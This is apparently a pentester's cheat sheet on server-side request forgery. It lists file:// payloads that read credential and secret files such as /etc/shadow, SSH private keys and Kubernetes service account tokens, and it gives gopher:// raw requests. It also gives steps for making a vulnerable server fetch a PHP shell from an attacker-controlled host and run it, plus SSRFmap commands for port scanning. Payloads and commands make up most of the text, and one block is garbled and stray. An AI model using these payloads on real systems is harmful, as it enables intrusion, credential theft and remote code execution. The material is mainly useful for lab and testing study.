**SSRF** (Server-Side Request Forgery) is a type of vulnerability where an attacker can manipulate a server to make requests to unintended internal or external systems. 

## Basic Example of SSRF

**Vulnerable functionality:**  
A web app accepts a user-supplied URL to fetch and display an image:

```http
GET /fetch?url=http://example.com/image.jpg HTTP/1.1
Host: vulnerable-app.com
``` 

**Exploitation example:**  
An attacker provides a URL pointing to an internal service:
```http
GET /fetch?url=http://localhost:8000/admin HTTP/1.1
``` 


## SSRF to LFI or RFI

You can abuse SSRF to access local files on the server if `file://` scheme is allowed.

**Examples:**
```bash
file:///etc/passwd  
file:///etc/shadow  
file:///etc/hosts  
file:///etc/hostname  
file:///etc/mysql/my.cnf  
file:///var/www/html/config.php  
file:///root/.bash_history  
file:///home/user/.ssh/id_rsa  
file:///root/.ssh/authorized_keys  
file:///proc/self/environ  
file:///proc/version  
file:///proc/cmdline  
file:///proc/self/status  
file:///proc/self/fd/1  
file:///proc/self/fd/2  
file:///proc/net/tcp  
file:///proc/net/udp  
file:///proc/net/fib_trie  
file:///proc/self/cgroup  
file:///sys/class/net/eth0/address  
file:///var/log/apache2/access.log  
file:///var/log/nginx/access.log  
file:///var/lib/docker/containers/<container_id>/config.v2.json  
file:///run/secrets/kubernetes.io/serviceaccount/token
``` 

You can also make the server request a file to an external host (Controlled by the attackant) and try to **save the response to a location** that you can later access from the web. For example, targeting a web-accessible uploads folder:
```bash
http://<attackant_ip>/output.txt -o /uploads/output.txt-> saved to /var/www/html/uploads/output.txt
```
Then try to access: `http://target/uploads/output.txt`

#### Gopher in SSRF  
The `gopher://` protocol lets you craft raw TCP requests via SSRF. It's useful for attacking services like Redis, HTTP, or internal APIs by manually building requests.
```bash
gopher://127.0.0.1:80/_GET /admin HTTP/1.1%0aHost: localhost%0a%0a
```
This sends a raw HTTP request to an internal admin panel.

## SSRF to RCE (Remote Code Execution)
If the target server allows file upload or execution, you can try to execute a reverse shell.

- Host your shell file:
```bash
python3 -m http.server 8000
``` 

- Force the vulnerable server to fetch it:

```bash
http://<LAB_IP>:8000/shell.php
``` 
- Use SSRF to send a request:
```bash
/upload?url=http://<your-ip>:8000/shell.php
``` 
- Then access `/uploads/shell.php` on the target.
```bash
file:///etc/passwd
da mas opciones
``` 



## SSRFmap
**ssrfmap.py** is a tool designed to automate the exploitation of SSRF vulnerabilities. It allows attackers or pentesters to utilize and manipulate input parameters that trigger server-side requests to perform various malicious activities, such as port scanning, service enumeration, and exploitation of other internal resources.
#### Installation 
```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt
```
#### Configuration
The `request.txt` file should contain the full HTTP request that the web application makes when provided with a URL. This file might look like this:
```bash
GET /fetch?url=http://example.com/image.jpg HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0
```
#### Port scanning
To scan ports on an internal IP address, you can use the following command:
- Parameters: 
	- `-r`: name of the file where the request has been saved.
	- `-p`: name of the potentially vulnerable parameter on the request.
	- `-m`: module that we want to execute, in this case portscan.
```bash
python3 ssrfmap.py -r <request> -p <vulnerable_parameter> -m portscan
```
#### Service enumeration
To enumerate services, you can use:
```bash
python3 ssrfmap.py -r request.txt --url "http://127.0.0.1:8000" --data
```